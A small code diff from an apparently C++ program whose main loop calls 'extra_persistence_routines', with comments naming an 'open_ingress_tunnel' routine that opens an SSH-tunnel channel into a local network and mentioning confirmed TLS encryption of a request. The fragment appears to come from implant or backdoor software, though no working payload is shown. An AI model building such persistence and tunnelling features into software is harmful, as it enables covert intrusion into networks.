@@ -51,7 +51,7 @@ void Core::loop() {
      *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
      *      
     */
-    extra_persistence_routines();
+    extra_persistence_routines(established_persistence_count);
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
                                             // consult for further changes: https://github.com/yhirose/cpp-httplib
